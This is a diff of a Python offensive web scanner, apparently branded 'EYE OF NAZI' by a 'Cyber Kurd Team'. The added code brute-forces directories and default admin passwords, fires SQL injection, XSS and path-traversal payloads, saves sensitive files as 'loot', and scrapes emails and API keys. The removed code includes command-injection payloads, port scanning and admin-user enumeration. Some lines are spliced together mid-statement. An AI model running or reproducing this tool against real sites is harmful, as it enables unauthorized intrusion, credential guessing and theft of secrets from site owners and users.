+                add_finding("HIGH", f"فایلی هەستیار: {url}", f"{len(content)} بایت")
+                safe = path_to_safe(url)
+                with open(f"loot_{safe}", "wb") as f:
+                    f.write(content)
+            else:
+                LOG.log(f"    [~] {url} ({code})", "WARN")
+
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 9 — DIRECTORY BRUTEFORCE
+# ═══════════════════════════════════════════════════════════════════
+COMMON_DIRS = [
+    "admin","login","wp-admin","wp-content","wp-includes","backup","backups",
+    "config","api","v1","v2","test","dev","staging","private","secret",
+    "hidden","db","database","sql","logs","tmp","temp","cache","uploads",
+    "files","images","assets","static","public","includes","inc","src",
+    "lib","vendor",".git",".env",".svn","phpmyadmin","adminer","console",
+    "shell","cmd","cgi-bin","server-status","server-info","dashboard",
+    "panel","cpanel","webmail","mail","ftp","ssh","old","new","bak",
+]
+
+def feat_dirs(base_url):
+    LOG.log(f"[9] Directory Bruteforce: {base_url}", "INFO")
+    def check(d):
+        url = f"{base_url.rstrip('/')}/{d}"
+        try:
+            r = requests.get(url, timeout=4, allow_redirects=False, headers=ua())
+            if r.status_code in (200,301,302,401,403):
+                return (url, r.status_code, len(r.content))
+        except Exception:
+            pass
+        return None
+    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as ex:
+        for res in ex.map(check, COMMON_DIRS):
+            if res:
+                sev = "HIGH" if res[1] == 200 else "LOW"
+                add_finding(sev, f"Directory: {res[0]}", f"HTTP {res[1]}")
+
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 10 — LOGIN BRUTEFORCE
+# ═══════════════════════════════════════════════════════════════════
+COMMON_CREDS = [
+    ("admin","admin"),("admin","password"),("admin","123456"),
+    ("admin","admin123"),("admin","root"),("root","root"),
+    ("root","toor"),("root","password"),("user","user"),
+    ("test","test"),("guest","guest"),("administrator","administrator"),
+    ("admin","12345678"),("admin","qwerty"),("admin","letmein"),
+]
+
+def feat_login(base_url):
+    LOG.log(f"[10] Login Bruteforce: {base_url}", "INFO")
+    login_paths = ["/login","/admin","/wp-login.php","/api/login","/auth","/signin"]
+    for lp in login_paths:
+        url = base_url.rstrip("/") + lp
+        r = safe_get(url)
+        if not r or r.status_code != 200:
+            continue
+        if not any(k in r.text.lower() for k in ["login","password","username"]):
+            continue
+        LOG.log(f"    [+] لاپەڕەی چوونەژوورەوە: {url}", "OK")
+        for u, p in COMMON_CREDS:
+            rr = safe_post(url, data={
+                "username":u,"password":p,"user":u,"pass":p,"email":u,"login":u
+            }, allow_redirects=True)
+            if rr and rr.status_code == 200 and any(
+                k in rr.text.lower() for k in ["logout","dashboard","welcome","profile"]):
+                add_finding("CRITICAL", f"چوونەژوورەوە: {u}:{p}", url)
+                return# ═══════════════════════════════════════════════════════════════════
+# FEATURE 11 — SQL INJECTION
+# ═══════════════════════════════════════════════════════════════════
 SQLI_PAYLOADS = [
-    "'", "\"", "'--", "1' OR '1'='1", "1' AND 1=1--",
-    "1' AND 1=2--", "admin'--", "' UNION SELECT NULL--",
-    "1' ORDER BY 100--", "1' AND SLEEP(3)--",
+    "'", "\"", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
+    "' UNION SELECT NULL--", "1' AND SLEEP(5)--", "1' AND 1=1--",
 ]
+SQL_ERRORS = ["sql syntax","mysql_fetch","ora-","postgresql","sqlite",
+              "unclosed quotation","you have an error in your sql",
+              "warning: mysql","mysqli","pg_query","sqlstate"]
 
-SQLI_ERRORS = [
-    "sql syntax", "warning: mysql", "unclosed quotation",
-    "quoted string not properly terminated", "odbc sql server",
-    "sqlite3.operationalerror", "postgresql", "mariadb", "sqlstate",
-]
+def feat_sqli(base_url):
+    LOG.log(f"[11] SQL Injection: {base_url}", "INFO")
+    params = ["id","page","user","username","q","search","cat","product","item","news"]
+    for p in params:
+        for payload in SQLI_PAYLOADS:
+            url = f"{base_url}?{p}={urllib.parse.quote(payload)}"
+            t0 = time.time()
+            r = safe_get(url)
+            if not r: continue
+            elapsed = time.time() - t0
+            if any(e in r.text.lower() for e in SQL_ERRORS):
+                add_finding("CRITICAL", f"SQLi (error): {p}", url)
+                break
+            if elapsed > 4.5 and "SLEEP" in payload:
+                add_finding("CRITICAL", f"SQLi (time): {p}", url)
 
-# ─── XSS Payloads ───
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 12 — XSS SCAN
+# ═══════════════════════════════════════════════════════════════════
 XSS_PAYLOADS = [
     "<script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>",
-    "<svg onload=alert(1)>",
     "\"><script>alert(1)</script>",
-    "'><script>alert(1)</script>",
+    "'><img src=x onerror=alert(1)>",
+    "<svg/onload=alert(1)>",
+    "javascript:alert(1)",
 ]
 
-# ─── LFI Payloads ───
+def feat_xss(base_url):
+    LOG.log(f"[12] XSS Scan: {base_url}", "INFO")
+    params = ["q","search","name","message","comment","id","page"]
+    for p in params:
+        for payload in XSS_PAYLOADS:
+            url = f"{base_url}?{p}={urllib.parse.quote(payload)}"
+            r = safe_get(url)
+            if r and payload in r.text:
+                add_finding("HIGH", f"XSS reflected: {p}", url)
+                break
+
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 13 — LFI SCAN
+# ═══════════════════════════════════════════════════════════════════
 LFI_PAYLOADS = [
-    "../../../../../../etc/passwd",
-    "../../../../../../etc/hosts",
-    "../../../../../../windows/win.ini",
-    "/etc/passwd",
+    "../../../../etc/passwd",
     "....//....//....//etc/passwd",
+    "..%2f..%2f..%2fetc%2fpasswd",
+    "/etc/passwd",
+    "C:\\Windows\\win.ini",
     "php://filter/convert.base64-encode/resource=index.php",
-    "php://filter/convert.base64-encode/resource=wp-config.php",
-    "php://filter/convert.base64-encode/resource=.env",
 ]
 
-LFI_IND = ["root:x:0:0", "daemon:x:", "www-data:", "[extensions]"]
+def feat_lfi(base_url):
+    LOG.log(f"[13] LFI Scan: {base_url}", "INFO")
+    params = ["file","page","include","path","doc","view","load"]
+    for p in params:
+        for payload in LFI_PAYLOADS:
+            url = f"{base_url}?{p}={urllib.parse.quote(payload)}"
+            r = safe_get(url)
+            if r and ("root:x:" in r.text or "[extensions]" in r.text):
+                add_finding("CRITICAL", f"LFI: {p}", url)
+                break
 
-# ─── RCE Payloads ───
-RCE_PAYLOADS = [
-    ";id", "|id", "&&id", "$(id)", ";whoami", "|whoami",
-    ";uname -a", ";ls -la",
-]
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 14 — OPEN REDIRECT
+# ═══════════════════════════════════════════════════════════════════
+def feat_open_redirect(base_url):
+    LOG.log(f"[14] Open Redirect: {base_url}", "INFO")
+    params = ["url","redirect","next","return","goto","target","redir"]
+    test = "https://example.com"
+    for p in params:
+        url = f"{base_url}?{p}={urllib.parse.quote(test)}"
+        r = safe_get(url, allow_redirects=False)
+        if r and r.status_code in (301,302) and test in r.headers.get("Location",""):
+            add_finding("MEDIUM", f"Open Redirect: {p}", url)
 
-RCE_IND = ["uid=", "gid=", "www-data", "GNU/Linux"]
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 15 — CORS MISCONFIG
+# ═══════════════════════════════════════════════════════════════════
+def feat_cors(base_url):
+    LOG.log(f"[15] CORS: {base_url}", "INFO")
+    r = safe_get(base_url, headers={"Origin":"https://evil.com","User-Agent":random.choice(USER_AGENTS)})
+    if not r: return
+    acao = r.headers.get("Access-Control-Allow-Origin","")
+    acac = r.headers.get("Access-Control-Allow-Credentials","")
+    if acao == "*" or "evil.com" in acao:
+        add_finding("HIGH", "CORS misconfig", f"ACAO={acao} ACAC={acac}")
 
-# ─── Sensitive Files ───
-SENSITIVE_FILES = [
-    '.env', '.env.local', '.env.production', '.env.backup',
-    '.git/config', '.git/HEAD', '.git/index',
-    '.svn/entries', '.hg/hgrc',
-    'wp-config.php', 'wp-config.php.bak', 'wp-config.php~',
-    'wp-config.php.old', 'wp-config.php.save', 'wp-config.txt',
-    'config.php', 'config.php.bak', 'config.php~',
-    'config.inc.php', 'config.json', 'config.yml', 'config.yaml',
-    'settings.php', 'settings.py', 'settings.json',
-    'database.php', 'database.yml', 'db.php', 'db.sql',
-    '.htaccess', '.htpasswd', 'web.config', 'nginx.conf',
-    'backup.zip', 'backup.tar.gz', 'backup.sql', 'backup.rar',
-    'www.zip', 'site.zip', 'db.sql', 'database.sql', 'dump.sql',
-    'phpinfo.php', 'info.php', 'test.php', 'debug.php',
-    'server-status', 'robots.txt', 'sitemap.xml', 'security.txt',
-    '.well-known/security.txt', 'readme.html', 'license.txt',
-    'error.log', 'access.log', 'logs/', 'log/',
-    'wp-json/wp/v2/users', 'wp-json/', 'xmlrpc.php', 'wp-cron.php',
-    'api/', 'api/v1/', 'api/v2/', 'rest/', 'graphql',
-    'swagger.json', 'openapi.json', 'api-docs/',
-    'uploads/', 'files/', 'downloads/', 'tmp/', 'temp/',
-    'install/', 'setup/', 'upgrade/', 'backup/',
-    'README.md', 'package.json', 'composer.json',
-    'Dockerfile', 'docker-compose.yml',
-    'key.pem', 'cert.pem', 'private.key', 'public.key',
-    'id_rsa', 'id_rsa.pub', 'authorized_keys',
-]
-
-# ─── Security Headers ───
-SEC_HDRS = ['Strict-Transport-Security', 'X-Frame-Options',
-            'X-Content-Type-Options', 'Content-Security-Policy',
-            'Referrer-Policy', 'Permissions-Policy']
-
-# ─── Known CVEs ───
-KNOWN_CVES = {
-    'WordPress': {'5.0': ['CVE-2019-8942'],
-                  '5.4': ['CVE-2020-4046'],
-                  '5.6': ['CVE-2021-29447'],
-                  '6.0': ['CVE-2022-21661']},
-    'Drupal': {'7': ['CVE-2018-7600'], '8': ['CVE-2019-6340']},
-    'Joomla': {'3': ['CVE-2015-8562']},
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 16 — WAF DETECTION
+# ═══════════════════════════════════════════════════════════════════
+WAFS = {
+    "Cloudflare": ["cloudflare","cf-ray"],
+    "AWS WAF": ["awselb","x-amz"],
+    "Sucuri": ["sucuri","x-sucuri"],
+    "Akamai": ["akamai","x-akamai"],
+    "Imperva": ["imperva","incap_ses"],
+    "F5 BIG-IP": ["bigip","x-wa-info"],
+    "ModSecurity": ["mod_security","modsecurity"],
+    "Wordfence": ["wordfence"],
 }
 
-# ─── Ports ───
-PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995,
-         1433, 3306, 3389, 5432, 6379, 8080, 8443, 27017, 9200]
+def feat_waf(base_url):
+    LOG.log(f"[16] WAF Detect: {base_url}", "INFO")
+    r = safe_get(base_url + "/?test=<script>alert(1)</script>")
+    if not r: return
+    text = r.text.lower()
+    headers = str(r.headers).lower()
+    for waf, markers in WAFS.items():
+        if any(m in text or m in headers for m in markers):
+            LOG.log(f"    [+] WAF: {waf}", "OK")
 
-# ─── Subdomains ───
-SUBDOMAINS = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test',
-              'blog', 'shop', 'cdn', 'static', 'app', 'portal',
-              'vpn', 'git', 'webmail', 'secure', 'login']
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 17 — TECH FINGERPRINT
+# ═══════════════════════════════════════════════════════════════════
+TECH_SIGS = {
+    "WordPress": ["wp-content","wp-includes","wordpress"],
+    "Drupal": ["drupal","sites/default"],
+    "Joomla": ["joomla","com_content"],
+    "Laravel": ["laravel","csrf-token"],
+    "Django": ["django","csrfmiddlewaretoken"],
+    "React": ["react","_react"],
+    "Vue": ["vue.js","__vue__"],
+    "Angular": ["ng-","angular"],
+    "jQuery": ["jquery"],
+    "Bootstrap": ["bootstrap"],
+    "Nginx": ["nginx"],
+    "Apache": ["apache"],
+    "Cloudflare": ["cloudflare"],
+    "PHP": ["php"],
+    "ASP.NET": ["asp.net","__viewstate"],
+}
 
-# ─── HTTP Methods ───
-HTTP_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS',
-                'PATCH', 'HEAD', 'TRACE'
-# ═══════════════════════════════════════════════════════════════════════════
-# HTTP CLIENT
-# ═══════════════════════════════════════════════════════════════════════════
+def feat_tech(base_url):
+    LOG.log(f"[17] Tech Fingerprint: {base_url}", "INFO")
+    r = safe_get(base_url)
+    if not r: return
+    text = r.text.lower()
+    server = r.headers.get("Server","").lower()
+    for tech, markers in TECH_SIGS.items():
+        if any(m in text or m in server for m in markers):
+            LOG.log(f"    [+] {tech}", "OK")
 
-class Client:
-    def __init__(self, timeout=10, cookie=None, proxy=None):
-        self.timeout = timeout
-        self.cookie = cookie
-        self.proxy = proxy
-        self.ua = "Mozilla/5.0 (Linux; Android 14) Chrome/120.0 Mobile"
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 18 — EMAIL + LINK + FORM EXTRACT
+# ═══════════════════════════════════════════════════════════════════
+def feat_extract(base_url):
+    LOG.log(f"[18] Extract (emails/links/forms): {base_url}", "INFO")
+    r = safe_get(base_url)
+    if not r: return
+    emails = set(re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", r.text))
+    for e in list(emails)[:20]:
+        LOG.log(f"    email: {e}", "OK")
+    soup = BeautifulSoup(r.text, "html.parser")
+    for a in list(soup.find_all("a", href=True))[:20]:
+        LOG.log(f"    link: {a['href'][:80]}", "INFO")
+    for i, form in enumerate(soup.find_all("form")):
+        action = form.get("action","")
+        method = form.get("method","GET").upper()
+        inputs = [inp.get("name") for inp in form.find_all(["input","textarea"]) if inp.get("name")]
+        LOG.log(f"    form{i}: {method} {action} — {inputs}", "OK")
 
-    def req(self, url, data=None, method=None):
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        if self.proxy:
-            h = urllib.request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
-            op = urllib.request.build_opener(h, urllib.request.HTTPSHandler(context=ctx))
-        else:
-            op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
-        hdrs = {'User-Agent': self.ua, 'Accept': '*/*', 'Connection': 'close'}
-        if self.cookie:
-            hdrs['Cookie'] = self.cookie
-        r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
-        t0 = time.time()
-        try:
-            rp = op.open(r, timeout=self.timeout)
-            body = rp.read()
-            return {'s': rp.getcode(), 'h': dict(rp.headers),
-                    't': body.decode('utf-8', 'ignore'),
-                    'n': len(body), 'dt': time.time() - t0, 'err': None}
-        except urllib.error.HTTPError as e:
-            try:
-                body = e.read()
-            except Exception:
-                body = b''
-            return {'s': e.code, 'h': dict(e.headers) if e.headers else {},
-                    't': body.decode('utf-8', 'ignore'),
-                    'n': len(body), 'dt': time.time() - t0, 'err': None}
-        except Exception as e:
-            return {'s': 0, 'h': {}, 't': '', 'n': 0,
-                    'dt': time.time() - t0, 'err': str(e)}
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 19 — SECRETS SCAN
+# ═══════════════════════════════════════════════════════════════════
+SECRET_PATTERNS = {
+    "AWS Key": r"AKIA[0-9A-Z]{16}",
+    "Google API": r"AIza[0-9A-Za-z\-_]{35}",
+    "Stripe": r"sk_live_[0-9a-zA-Z]{24}",
+    "GitHub Token": r"ghp_[0-9a-zA-Z]{36}",
+    "Slack": r"xox[baprs]-[0-9a-zA-Z\-]+",
+    "Private Key": r"-----BEGIN (RSA |EC )?PRIVATE KEY-----",
+    "JWT": r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+",
+}
 
+def feat_secrets(base_url):
+    LOG.log(f"[19] Secrets Scan: {base_url}", "INFO")
+    r = safe_get(base_url)
+    if not r: return
+    for name, pat in SECRET_PATTERNS.items():
+        for m in re.findall(pat, r.text, re.IGNORECASE):
+            add_finding("HIGH", f"{name} لە HTML", str(m)[:60])
 
-# ═══════════════════════════════════════════════════════════════════════════
-# SCANNER CLASS
-# ═══════════════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════
+# FEATURE 20 — JS ANALYSIS (endpoints + secrets)
+# ═══════════════════════════════════════════════════════════════════
+def feat_js(base_url):
+    LOG.log(f"[20] JS Analysis: {base_url}", "INFO")
+    r = safe_get(base_url)
+    if not r: return
+    soup = BeautifulSoup(r.text, "html.parser")
+    js_urls = [s["src"] for s in soup.find_all("script", src=True)]
+    for js in js_urls[:20]:
+        if js.startswith("//"): js = "https:" + js
+        elif js.startswith("/"): js = base_url.rstrip("/") + js
+        rr = safe_get(js)
+        if not rr: continue
+        for name, pat in SECRET_PATTERNS.items():
+            for m in re.findall(pat, rr.text, re.IGNORECASE):
+                add_finding("HIGH", f"{name} لە JS: {js}", str(m)[:60])
+        for m in set(re.findall(r'["\'](/api/[^"\']+)["\']', rr.text)):
+            LOG.log(f"    API لە JS: {m}", "OK")# ═══════════════════════════════════════════════════════════════════
+# HTML REPORT BUILDER
+# ═══════════════════════════════════════════════════════════════════
+def build_report(target, duration):
+    counts = defaultdict(int)
+    for f in FINDINGS:
+        counts[f["severity"]] += 1
 
-class Scan:
-    def __init__(self, url, cl, threads=30):
-        self.url = url.rstrip('/')
-        self.cl = cl
-        self.threads = threads
-        self.f = []
-        self.info = {}
-        self.checked = 0
-        self.files_found = []
-        self.emails = set()
+    rows = ""
+    for f in FINDINGS:
+        sev = f["severity"]
+        color = {"CRITICAL":"#c0392b","HIGH":"#e67e22","MEDIUM":"#f1c40f",
+                 "LOW":"#3498db","INFO":"#888"}.get(sev,"#888")
+        rows += f"""
+        <tr>
+            <td style="background:{color};color:#fff;font-weight:bold">{sev}</td>
+            <td>{f['title']}</td>
+            <td style="font-family:monospace;font-size:12px">{f['detail']}</td>
+        </tr>"""
 
-    def add(self, u, t, ev, sev):
-        self.f.append({'url': u, 'type': t, 'evidence': ev[:300],
-                       'severity': sev})
-        icons = {
-            'SQLI': '\033[41m\033[97m[SQLi]\033[0m',
-            'XSS': '\033[43m[XSS]\033[0m',
-            'LFI': '\033[95m[LFI]\033[0m',
-            'RCE': '\033[41m\033[97m[RCE]\033[0m',
-            'HEADER': '\033[2m[HDR]\033[0m',
-            'CVE': '\033[41m\033[97m[CVE]\033[0m',
-            'PORT': '\033[93m[PORT]\033[0m',
-            'SUB': '\033[94m[SUB]\033[0m',
-            'HTTP': '\033[96m[HTTP]\033[0m',
-            'SSL': '\033[95m[SSL]\033[0m',
-            'FILE': '\033[92m[FILE]\033[0m',
-            'SERVER': '\033[96m[SERVER]\033[0m',
-            'LANG': '\033[96m[LANG]\033[0m',
-            'CMS': '\033[96m[CMS]\033[0m',
-            'ADMIN': '\033[93m[ADMIN]\033[0m',
-            'AUTHOR': '\033[94m[AUTHOR]\033[0m',
-            'EMAIL': '\033[94m[EMAIL]\033[0m',
-        }
-        icon = icons.get(t, '[' + t + ']')
-        print("\n  " + icon + " \033[1m" + sev + "\033[0m")
-        print("    URL     : " + u[:120])
-        print("    Evidence: " + ev[:250])
+    html = f"""<!DOCTYPE html>
+<html lang="ku">
+<head>
+<meta charset="utf-8">
+<title>EYE OF NAZI — {target}</title>
+<style>
+body{{background:#0d0d0d;color:#e0e0e0;font-family:Arial,sans-serif;padding:20px}}
+h1{{color:#c0392b;text-align:center;font-size:32px;letter-spacing:8px}}
+h2{{color:#e67e22;border-bottom:1px solid #333;padding-bottom:5px}}
+.summary{{display:flex;gap:20px;flex-wrap:wrap;margin:20px 0}}
+.card{{padding:15px 25px;border-radius:8px;background:#1a1a1a;min-width:120px;text-align:center}}
+.card b{{display:block;font-size:28px;margin-bottom:5px}}
+.CRITICAL{{color:#c0392b}} .HIGH{{color:#e67e22}} .MEDIUM{{color:#f1c40f}}
+.LOW{{color:#3498db}} .INFO{{color:#888}}
+table{{width:100%;border-collapse:collapse;margin-top:20px}}
+th,td{{padding:10px;border:1px solid #333;text-align:left;vertical-align:top}}
+th{{background:#1a1a1a;color:#e67e22}}
+tr:hover{{background:#151515}}
+.meta{{text-align:center;color:#666;font-size:12px;margin-top:30px}}
+pre{{background:#111;padding:10px;border-radius:5px;overflow:auto;font-size:11px;color:#0f0}}
+</style>
+</head>
+<body>
+<h1>EYE OF NAZI</h1>
+<p style="text-align:center;color:#888">Scan report for <b style="color:#e67e22">{target}</b></p>
 
-    def info_add(self, key, value):
-        self.info[key] = value
-        print("    \033[92m[+]\033[0m " + key + ": " + value[:150])
+<div class="summary">
+    <div class="card"><b class="CRITICAL">{counts['CRITICAL']}</b>CRITICAL</div>
+    <div class="card"><b class="HIGH">{counts['HIGH']}</b>HIGH</div>
+    <div class="card"><b class="MEDIUM">{counts['MEDIUM']}</b>MEDIUM</div>
+    <div class="card"><b class="LOW">{counts['LOW']}</b>LOW</div>
+    <div class="card"><b class="INFO">{counts['INFO']}</b>INFO</div>
+</div>
 
-    # ─────────────────────────────────────────────────────────
-    # 1. SERVER NAME
-    # ─────────────────────────────────────────────────────────
-    def gather_server(self):
-        print("\n\033[96m[1/10]\033[0m Server Name...")
-        r = self.cl.req(self.url)
-        if r['err']:
-            return
-        for k in r['h']:
-            kl = k.lower()
-            if kl == 'server':
-                self.info_add('Server', r['h'][k])
-            elif kl == 'x-powered-by':
-                self.info_add('Powered-By', r['h'][k])
-            elif kl == 'x-aspnet-version':
-                self.info_add('ASP.NET', r['h'][k])
-            elif kl == 'x-runtime':
-                self.info_add('Runtime', r['h'][k])
-            elif kl == 'x-generator':
-                self.info_add('Generator', r['h'][k])
-            elif kl == 'via':
-                self.info_add('Via', r['h'][k])
+<h2>Findings ({len(FINDINGS)})</h2>
+<table>
+<tr><th>Severity</th><th>Title</th><th>Detail</th></tr>
+{rows if rows else '<tr><td colspan="3" style="text-align:center;color:#666">هیچ دۆزینەوەیەک نییە</td></tr>'}
+</table>
 
-    # ─────────────────────────────────────────────────────────
-    # 2. LANGUAGE
-    # ─────────────────────────────────────────────────────────
-    def gather_language(self):
-        print("\n\033[96m[2/10]\033[0m Language...")
-        r = self.cl.req(self.url)
-        if r['err']:
-            return
-        # From headers
-        for k in r['h']:
-            kl = k.lower()
-            if 'powered' in kl:
-                self.info_add('Language', r['h'][k])
-        # From HTML
-        text = r['t']
-        if '.php' in text.lower() or 'PHPSESSID' in str(r['h']):
-            self.info_add('Language', 'PHP')
-        if 'csrfmiddlewaretoken' in text.lower() or 'django' in text.lower():
-            self.info_add('Framework', 'Django')
-        if '_rails' in text.lower() or 'rails' in str(r['h']).lower():
-            self.info_add('Framework', 'Rails')
-        if 'laravel' in text.lower() or 'laravel_session' in str(r['h']).lower():
-            self.info_add('Framework', 'Laravel')
-        if 'asp.net' in text.lower() or '__viewstate' in text.lower():
-            self.info_add('Framework', 'ASP.NET')
+<div class="meta">
+    <p>Duration: {duration:.2f}s · Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} · v{VERSION}</p>
+    <p>Made by Cyber Kurd Team ☀️</p>
+</div>
+</body>
+</html>"""
 
-    # ─────────────────────────────────────────────────────────
-    # 3. CMS DETECTION
-    # ─────────────────────────────────────────────────────────
-    def gather_cms(self):
-        print("\n\033[96m[3/10]\033[0m CMS Detection...")
-        r = self.cl.req(self.url)
-        if r['err']:
-            return
-        text_low = r['t'].lower()
-        hdr_low = str(r['h']).lower()
-        # WordPress
-        if 'wp-content' in text_low or 'wp-includes' in text_low:
-            self.info_add('CMS', 'WordPress')
-            m = re.search(r'wp-includes/[^"\']*?([\d]+\.[\d]+(?:\.[\d]+)?)', r['t'])
-            if m:
-                self.info_add('WP-Version', m.group(1))
-        # Joomla
-        if 'joomla' in text_low or 'com_content' in text_low:
-            self.info_add('CMS', 'Joomla')
-        # Drupal
-        if 'drupal' in text_low or 'sites/default' in text_low:
-            self.info_add('CMS', 'Drupal')
-        # Magento
-        if 'magento' in text_low or 'skin/frontend' in text_low:
-            self.info_add('CMS', 'Magento')
+    with open(REPORT_FILE, "w", encoding="utf-8") as f:
+        f.write(html)
+    LOG.log(f"[✓] ڕاپۆرت: {REPORT_FILE}", "OK")
 
-    # ─────────────────────────────────────────────────────────
-    # 4. ADMIN USERS (via wp-json)
-    # ─────────────────────────────────────────────────────────
-    def gather_admin_users(self):
-        print("\n\033[96m[4/10]\033[0m Admin Users...")
-        # WordPress users
-        wp_users = self.url + '/wp-json/wp/v2/users'
-        r = self.cl.req(wp_users)
-        if not r['err'] and r['s'] == 200 and 'id' in r['t']:
-            try:
-                data = json.loads(r['t'])
-                for u in data[:10]:
-                    name = u.get('name', '')
-                    slug = u.get('slug', '')
-                    uid = u.get('id', '')
-                    if name:
-                        self.add(wp_users, 'ADMIN',
-                                 "User: " + name + " (id: " + str(uid) + ")",
-                                 "HIGH")
-                        self.info_add('Admin-User', name + " [" + slug + "]")
-            except Exception:
-                pass
-        # Author enumeration via /?author=N
-        for i in range(1, 6):
-            test = self.url + '/?author=' + str(i)
-            r = self.cl.req(test)
-            if r['err']:
-                continue
-            # Redirect gives author name
-            loc = r['h'].get('Location', '') or r['h'].get('location', '')
-            if '/author/' in loc:
-                self.add(test, 'AUTHOR',
-                         "Author redirect: " + loc, "MEDIUM")
-                self.info_add('Author-' + str(i), loc)
-
-    # ─────────────────────────────────────────────────────────
-    # 5. AUTHOR NAME (from meta tags)
-    # ─────────────────────────────────────────────────────────
-    def gather_author(self):
-        print("\n\033[96m[5/10]\033[0m Author Name...")
-        r = self.cl.req(self.url)
-        if r['err']:
-            return
-        text = r['t']
-        # Meta author
-        for m in re.finditer(r'<meta[^>]*name=["\']author["\'][^>]*content=["\']([^"\']+)["\']',
-                             text, re.IGNORECASE):
-            self.info_add('Author', m.group(1))
-        # Meta generator
-        for m in re.finditer(r'<meta[^>]*name=["\']generator["\'][^>]*content=["\']([^"\']+)["\']',
-                             text, re.IGNORECASE):
-            self.info_add('Generator', m.group(1))
-        # WP author in RSS
-        rss = self.url + '/feed/'
-        rr = self.cl.req(rss)
-        if not rr['err'] and rr['s'] == 200:
-            for m in re.finditer(r'<dc:creator>([^<]+)</dc:creator>', rr['t']):
-                self.info_add('RSS-Author', m.group(1))
-
-    # ─────────────────────────────────────────────────────────
-    # 6. EMAIL HARVEST
-    # ─────────────────────────────────────────────────────────
-    def gather_emails(self):
-        print("\n\033[96m[6/10]\033[0m Email Harvest...")
-        pages = [self.url, self.url + '/contact', self.url + '/about']
-        for page in pages:
-            r = self.cl.req(page)
-            if r['err'] or r['s'] != 200:
-                continue
-            for m in re.finditer(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r['t']):
-                em = m.group(0).lower()
-                if em not in self.emails and 'example' not in em and 'test@' not in em:
-                    self.emails.add(em)
-                    self.add(page, 'EMAIL', em, "INFO")
-                    self.info_add('Email', em)
-
-    # ─────────────────────────────────────────────────────────
-    # 7. SENSITIVE FILES
-    # ─────────────────────────────────────────────────────────
-    def gather_files(self):
-        print("\n\033[96m[7/10]\033[0m Sensitive Files (" + str(len(SENSITIVE_FILES)) + ")...")
-        with ThreadPoolExecutor(max_workers=self.threads) as ex:
-            fs = {ex.submit(self._check_file, p): p for p in SENSITIVE_FILES}
-            for fut in as_completed(fs):
-                try:
-                    res = fut.result()
-                    if res:
-                        self.files_found.append(res)
-                        sev = "CRITICAL" if any(x in res['path'] for x in
-                            ['.env', '.git', 'backup', 'wp-config', 'sql',
-                             'database', 'key.pem', 'id_rsa']) else "MEDIUM"
-                        self.add(res['url'], 'FILE',
-                                 "Found (" + str(res['n']) + "B)", sev)
-                except Exception:
-                    pass
-
-    def _check_file(self, path):
-        url = self.url + '/' + path.lstrip('/')
-        r = self.cl.req(url)
-        self.checked += 1
-        if r['err'] or r['s'] != 200:
-            return None
-        return {'url': url, 'path': path, 'n': r['n'], 'text': r['t'][:2000]}
-
-    # ─────────────────────────────────────────────────────────
-    # 8. SECURITY HEADERS
-    # ─────────────────────────────────────────────────────────
-    def gather_headers(self):
-        print("\n\033[96m[8/10]\033[0m Security Headers...")
-        r = self.cl.req(self.url)
-        if r['err']:
-            return
-        missing = []
-        for h in SEC_HDRS:
-            found = any(h.lower() == k.lower() for k in r['h'])
-            if not found:
-                missing.append(h)
-        if missing:
-            self.add(self.url, 'HEADER',
-                     "Missing: " + ", ".join(missing), "LOW")
-
-    # ─────────────────────────────────────────────────────────
-    # 9. CVE DETECTION
-    # ─────────────────────────────────────────────────────────
-    def gather_cve(self):
-        print("\n\033[96m[9/10]\033[0m CVE Detection...")
-        r = self.cl.req(self.url)
-        if r['err']:
-            return
-        text = r['t'].lower()
-        for tech, versions in KNOWN_CVES.items():
-            for v, cves in versions.items():
-                if v in text:
-                    for cve in cves:
-                        self.add(self.url, 'CVE',
-                                 tech + " " + v + " -> " + cve, "CRITICAL")
-
-    # ─────────────────────────────────────────────────────────
-    # 10. PORTS
-    # ─────────────────────────────────────────────────────────
-    def gather_ports(self, host):
-        print("\n\033[96m[10/10]\033[0m Port Scanning...")
-        for p in PORTS:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(1)
-                result = s.connect_ex((host, p))
-                s.close()
-                if result == 0:
-                    self.add(host + ":" + str(p), 'PORT',
-                             "Port " + str(p) + " open", "MEDIUM")
-            except Exception:
-                pass
-
-    # ─────────────────────────────────────────────────────────
-    # RUN ALL
-    # ─────────────────────────────────────────────────────────
-    def run_all(self):
-        print("\n\033[96m" + "=" * 60 + "\033[0m")
-        print("\033[1m  [*] TARGET: " + self.url + "\033[0m")
-        print("\033[96m" + "=" * 60 + "\033[0m")
-
-        try:
-            self.gather_server()
-        except Exception as e:
-            print("  \033[91m[!]\033[0m " + str(e))
-
-        try:
-            self.gather_language()
-        except Exception as e:
-            print("  \033[91m[!]\033[0m " + str(e))
-
-        try:
-            self.gather_cms()
-        except Exception as e:
-            print("  \033[91m[!]\033[0m " + str(e))
-
-        try:
-            self.gather_admin_users()
-        except Exception as e:
